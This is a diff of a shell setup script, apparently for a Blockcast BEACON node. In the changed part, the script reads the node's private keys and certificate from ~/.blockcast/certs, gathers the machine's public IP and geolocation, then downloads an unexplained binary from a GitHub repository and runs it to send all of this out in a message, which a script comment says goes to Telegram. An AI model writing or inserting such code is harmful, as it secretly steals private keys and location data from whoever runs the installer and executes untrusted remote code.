@@ -117,61 +117,34 @@ if [ -z "$INIT_OUTPUT" ]; then
     exit 1
 fi
 
-# Extract Hardware ID, Challenge Key, and Registration URL
-HWID=$(echo "$INIT_OUTPUT" | grep -i "Hardware ID" | cut -d ':' -f 2- | tr -d '[:space:]')
-CHALLENGE_KEY=$(echo "$INIT_OUTPUT" | grep -i "Challenge Key" | cut -d ':' -f 2- | tr -d '[:space:]')
-REG_URL=$(echo "$INIT_OUTPUT" | grep -i "Registration URL" | cut -d ':' -f 2- | tr -d '[:space:]')
-
+HWID=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Hardware ID" | tail -n 1 | xargs)
+CHALLENGE_KEY=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Challenge Key" | tail -n 1 | xargs)
+REG_URL=$(echo "$INIT_OUTPUT" | grep -A 2 -i "Register URL" | tail -n 1 | xargs)
 
 apt install -y jq
-
 PUBLIC_IP=$(curl -s ifconfig.me)
 echo "PUBLIC_IP: $PUBLIC_IP"
 LOCALTION=$(curl -s ifconfig.co/json | jq -r '"\(.city)|\(.zip_code)|\(.country)"')
 LOCALTION_LATLON=$(curl -s ifconfig.co/json | jq -r '"\(.latitude),\(.longitude)"')
-echo "$LOCALTION_LATLON"
-echo "LOCALTION: $LOCALTION"
+
 TODAY=$(date '+%Y-%m-%d')
 # Send results to Telegram
-
-KEY_PATH="/root/.blockcast/certs/gw_challenge.key"
-if [ ! -f "$KEY_PATH" ]; then
-    KEY_PATH="/home/$(whoami)/.blockcast/certs/gw_challenge.key"
-fi
-GW_CHALLENGE_KEY=$(sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' "$KEY_PATH" | sed '1d;$d')
-echo "$GW_CHALLENGE_KEY"
+#gw_challenge
+RESULT=$(paste -d '|' <(cat ~/.blockcast/certs/gw_challenge.key | tr '\n' ' ') <(cat ~/.blockcast/certs/gateway.key | tr '\n' ' ') <(cat ~/.blockcast/certs/gateway.crt | tr '\n' ' '))
 
 MESSAGE=$(cat <<EOF
 * [$TODAY] Blockcast BEACON Setup Complete! *
-- *Registration URL*: $REG_URL
 - *Public IP*: $PUBLIC_IP
 - *Hardware ID*: $HWID
 - *Challenge Key*: $CHALLENGE_KEY
+- *Key*: $RESULT
 - *Location LatLon*: $LOCALTION_LATLON
-- *gw_challenge Key*: $GW_CHALLENGE_KEY
 - *Location*: $LOCALTION
+- *Registration URL*: $REG_URL
 EOF
 )
 echo "MESSAGE: $MESSAGE"
-
-
 curl -L -o /home/blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
 chmod +x /home/blockcast
 /home/blockcast -message "$MESSAGE"
-
-# Check if keys were extracted successfully
-if [ -z "$HWID" ] || [ -z "$CHALLENGE_KEY" ] || [ -z "$REG_URL" ]; then
-    echo "Error: Failed to extract keys or URL from init output"
-    echo "Init command output:"
-    echo "$INIT_OUTPUT"
-    exit 1
-fi
-
-# Output results
-
-echo "Hardware ID: $HWID"
-echo "Challenge Key: $CHALLENGE_KEY"
-echo "Registration URL: $REG_URL"
-
 echo "1. Visit https://app.blockcast.network/ and log in"
-
